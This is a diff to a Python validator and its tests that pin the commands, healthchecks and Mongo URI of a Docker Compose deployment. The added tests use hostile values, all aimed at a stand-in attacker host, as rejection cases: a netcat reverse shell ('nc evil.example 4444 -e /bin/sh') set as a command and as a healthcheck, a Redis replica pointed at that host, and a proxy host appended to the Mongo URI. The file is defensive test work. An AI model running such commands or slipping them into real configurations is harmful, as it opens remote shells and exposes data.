@@ -57,6 +57,16 @@ API_HEALTHCHECK = [
     "CMD", "node", "-e",
     "fetch('http://127.0.0.1:3000/api/v1/healthcheck').then(r => process.exit(r.ok ? 0 : 1)).catch(() => process.exit(1))",
 ]
+PINNED_COMMANDS = {
+    "space-mongo": ["mongod", "--wiredTigerCacheSizeGB", "0.25"],
+    "space-redis": ["redis-server", "--maxmemory", "64mb", "--maxmemory-policy", "noeviction"],
+}  # space-api has no command: it runs the image entrypoint
+PINNED_DB_HEALTHCHECKS = {
+    "space-mongo": ["CMD-SHELL", "mongosh --quiet --eval \"db.adminCommand('ping').ok\""],
+    "space-redis": ["CMD", "redis-cli", "ping"],
+}
+# The only form of MONGO_URI; it is also the only place that may embed the Mongo password reference.
+MONGO_URI = "mongodb://space:${DEMO_SPACE_MONGO_PASSWORD}@space-mongo:27017/space_db?authSource=admin"
 SPHERE = {
     "SPHERE_SYNC_ENABLED": "true",
     "SPHERE_PUBLIC_URL": "https://sphere.score.us.es",
@@ -221,6 +231,8 @@ def rule_secrets(manifest: dict, documented: set[str]) -> str | None:
     match = re.match(r"mongodb://[^:/@]+:([^@/]*)@", uri)
     if not match or match.group(1) != MONGO_PASSWORD_REFERENCE:
         return f"MONGO_URI must embed exactly {MONGO_PASSWORD_REFERENCE} as its password"
+    if uri != MONGO_URI:
+        return f"MONGO_URI must be exactly {MONGO_URI}"
     # The pins above place each reference; the counts rule out a copy anywhere else (a URL query, another variable).
     texts = list(rules._strings(manifest))
     for reference in SECRET_REFERENCES:
@@ -256,6 +268,14 @@ def rule_api_surface(manifest: dict) -> str | None:
         return "REDIS_URL must be redis://space-redis:6379, without credentials"
     if api.get("healthcheck", {}).get("test") != API_HEALTHCHECK:
         return "space-api healthcheck command differs from the pinned one"
+    if "command" in api or "entrypoint" in api:
+        return "space-api must run the image entrypoint, without a command"
+    for name, command in PINNED_COMMANDS.items():
+        if manifest["services"][name].get("command") != command:
+            return f"{name} command differs from the pinned one"
+    for name, test in PINNED_DB_HEALTHCHECKS.items():
+        if manifest["services"][name].get("healthcheck", {}).get("test") != test:
+            return f"{name} healthcheck command differs from the pinned one"
     return None
 
 
@@ -584,6 +604,9 @@ def test_control_refuses_unbraced_or_swapped_secret_references():
     absent = sample()
     del _env_of(absent)["JWT_SALT"]
     assert "missing" in _check_secrets(absent)
+    proxied = sample()
+    _env_of(proxied)["MONGO_URI"] = MONGO_URI + "&proxyHost=evil.example"
+    assert "MONGO_URI must be exactly" in _check_secrets(proxied)
     literal = sample()
     _env_of(literal)["MONGO_URI"] = "mongodb://root:hunter2@space-mongo:27017/space"
     assert "MONGO_URI" in _check_secrets(literal)
@@ -688,6 +711,21 @@ def test_control_pins_the_api_environment_and_healthcheck():
     gone = sample()
     del _api(gone)["healthcheck"]
     assert "healthcheck" in rule_api_surface(gone)
+    replica = sample()
+    replica["services"]["space-redis"]["command"] += ["--replicaof", "evil.example", "6379"]
+    assert "space-redis command" in rule_api_surface(replica)
+    mongo_command = sample()
+    mongo_command["services"]["space-mongo"]["command"] += ["--bind_ip_all"]
+    assert "space-mongo command" in rule_api_surface(mongo_command)
+    shell = sample()
+    _api(shell)["command"] = ["sh", "-c", "nc evil.example 4444 -e /bin/sh"]
+    assert "without a command" in rule_api_surface(shell)
+    mongo_check = sample()
+    mongo_check["services"]["space-mongo"]["healthcheck"]["test"] = ["CMD-SHELL", "nc evil.example 4444 -e /bin/sh"]
+    assert "space-mongo healthcheck" in rule_api_surface(mongo_check)
+    redis_check = sample()
+    redis_check["services"]["space-redis"]["healthcheck"]["test"] = ["CMD", "redis-cli", "-h", "evil.example", "ping"]
+    assert "space-redis healthcheck" in rule_api_surface(redis_check)
 
 
 def test_control_runbook_parsers_refuse_malformed_text():
@@ -699,6 +737,7 @@ def test_control_runbook_parsers_refuse_malformed_text():
     assert not gap_is_open(good.replace(f"see {CRP}", "see the owner")), "space-api without the CRP id"
     assert not gap_is_open(good.replace(f"see {CRP}", "see the owner")
                            + f"\n## Notes\n\n- space-api waits for {CRP}\n"), "named only outside ## GAP"
+    assert verified_images(good.replace(MONGO_IMAGE, MONGO_IMAGE[:-1])) == [], "a truncated digest is not 64 hex"
     assert verified_images(good.replace(" - verified 2026-10-24", " - pending")) == []
     assert verified_images(good.replace(" - verified 2026-10-24", " - verified")) == []
     assert verified_images(good.replace("## Verified image references", "## Candidates")) == []
